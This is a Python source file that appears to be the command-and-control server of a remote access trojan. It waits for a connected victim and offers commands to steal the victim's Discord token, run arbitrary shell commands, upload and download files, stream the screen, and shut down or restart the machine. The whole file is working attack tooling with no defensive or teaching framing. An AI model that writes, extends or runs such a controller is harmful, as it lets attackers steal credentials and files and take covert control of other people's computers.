import socket
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('127.0.0.1', 1234))
s.listen(1)

conn, addr = s.accept()
print(f'Client connected: {addr}')

while True:
    cmd = input('What you would do: ')
    
    if cmd == 'exit':
        break
    
    if cmd == 'help':
        print('''
              All commands:
                exit - exit the program
                help - show this message
                discord_token - get the Discord token
                shutdown - shutdown the computer
                restart - restart the computer
                sleep - sleep the computer
                put - put a file on the computer
                get - get a file from the computer
                cmd - run a command on the computer
                stream - stream the computer's screen
                start - start a program''')

    if cmd == 'discord_token':
        conn.send(cmd.encode())
        answer = conn.recv(10240).decode()
        print(answer)
    
    elif cmd == 'shutdown':
        conn.send(cmd.encode())
        print('Computer will shutdown in 5 seconds')
    
    elif cmd == 'restart':
        conn.send(cmd.encode())
        print('Computer will restart in 5 seconds')

    elif cmd == 'sleep':
        conn.send(cmd.encode())

    elif cmd == 'put':
        filename = input('Filename: ').encode()
        if not os.path.isfile(filename.decode()):
            print('File not found')
        else:
            conn.send(cmd.encode())
            conn.send(filename)
            with open(filename.decode(), 'rb') as f:
                data = f.read()
                while data:
                    conn.send(data)
                    data = f.read()
            print('File sent successfully')
    
    elif cmd == 'get':
        conn.send(cmd.encode())
        filename = input('Filename: ').encode()
        conn.send(filename)
        found = conn.recv(10240).decode()
        if found == 'False':
            print('File not found')
        else:
            with open(filename.decode(), 'wb') as f:
                data = conn.recv(10240000)
                f.write(data)
            print('File received successfully')
    
    elif cmd == 'cmd':
        conn.send(cmd.encode())
        cmd = input('Command: ').encode()
        if not cmd:
            conn.send('cls'.encode())
        conn.send(cmd)
        answer = conn.recv(10240).decode()
        print(f'Output: \n{answer}')
    
    elif cmd == 'stream':
        conn.send(cmd.encode())
    
    elif cmd == 'start':
        conn.send(cmd.encode())
    
    else:
        print('Invalid command')

conn.close()